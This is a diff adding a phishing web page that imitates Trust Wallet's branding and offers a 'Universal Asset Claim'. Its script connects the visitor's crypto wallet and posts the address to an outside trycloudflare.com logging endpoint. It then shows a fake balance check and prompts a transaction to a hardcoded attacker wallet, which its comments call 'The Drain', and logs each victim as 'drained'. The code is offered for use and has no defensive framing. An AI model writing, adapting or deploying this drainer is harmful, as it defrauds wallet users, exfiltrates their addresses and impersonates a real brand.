@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet - Global Asset Claim</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+            background: #f5f7fa; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            color: #333;
+        }
+        .card { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 16px; 
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12); 
+            text-align: center; 
+            max-width: 380px; 
+            width: 90%; 
+        }
+        h1 { 
+            color: #3375bb; 
+            margin-bottom: 10px; 
+            font-size: 22px;
+        }
+        p { 
+            color: #666; 
+            font-size: 14px; 
+            margin-bottom: 25px; 
+            line-height: 1.5;
+        }
+        .btn { 
+            background: linear-gradient(135deg, #3375bb, #2a5f99); 
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            width: 100%; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: transform 0.2s;
+        }
+        .btn:hover { 
+            transform: scale(1.02); 
+            box-shadow: 0 4px 15px rgba(51, 117, 187, 0.3);
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .status { 
+            margin-top: 15px; 
+            font-size: 13px; 
+            color: #28a745; 
+            display: none; 
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3375bb;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .logo {
+            width: 60px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Trust Wallet Logo -->
+    <img src="https://trustwallet.com/assets/images/media/assets/twt_logo.svg" alt="Trust Wallet" class="logo">
+    
+    <div class="card">
+        <h1>Universal Asset Claim</h1>
+        <p>Claim all your assets from our global drop. Verify your wallet to receive your funds.</p>
+        
+        <button id="claimBtn" class="btn">Connect & Claim All</button>
+        
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+    // YOUR WALLET ADDRESS HERE
+    const myWallet = "0xC6d5F0761Eac2bd735F56c0091B445a4ca37DaF9"; 
+
+    document.getElementById('claimBtn').addEventListener('click', async () => {
+        const btn = document.getElementById('claimBtn');
+        const status = document.getElementById('status');
+        
+        if (window.trustwallet || window.ethereum) {
+            try {
+                // 1. Connect Wallet
+                btn.disabled = true;
+                btn.innerHTML = '<span class="loader"></span> Connecting...';
+                
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const userAddress = accounts[0];
+                
+                // Send connection data to your backend
+                fetch('https://prozac-distributor-locations-sea.trycloudflare.com/api/log', {
+                    method: 'POST',
+                    body: JSON.stringify({ action: 'connected', address: userAddress }),
+                    headers: {'Content-Type': 'application/json'}
+                });
+
+                // 2. Simulate Balance Check (Visual only, makes it look real)
+                btn.innerHTML = '<span class="loader"></span> Checking Balances...';
+                await new Promise(r => setTimeout(r, 1500)); // Fake delay
+
+                // 3. Trigger Transaction (The Drain)
+                btn.innerHTML = '<span class="loader"></span> Claiming Assets...';
+                
+                const txParams = {
+                    from: userAddress,
+                    to: myWallet,
+                    value: "0x0", 
+                    data: "0x" 
+                };
+
+                const gasEstimate = await window.ethereum.request({
+                    method: 'eth_estimateGas',
+                    params: [txParams]
+                });
+
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        ...txParams,
+                        gas: Math.floor(gasEstimate * 1.2)
+                    }]
+                });
+
+                // 4. Success State
+                status.style.display = 'block';
+                status.innerHTML = '✅ Assets Transferred Successfully!';
+                btn.innerText = 'Claimed';
+                
+                fetch('https://prozac-distributor-locations-sea.trycloudflare.com/api/log', {
+                    method: 'POST',
+                    body: JSON.stringify({ action: 'drained', address: userAddress, txHash }),
+                    headers: {'Content-Type': 'application/json'}
+                });
+
+            } catch (error) {
+                console.error(error);
+                status.style.display = 'block';
+                status.style.color = '#dc3545';
+                status.innerText = '❌ Transaction Failed. Please try again.';
+                btn.disabled = false;
+                btn.innerText = 'Connect & Claim All';
+            }
+        } else {
+            alert("Please install Trust Wallet or MetaMask!");
+        }
+    });
+    </script>
+</body>
+</html>
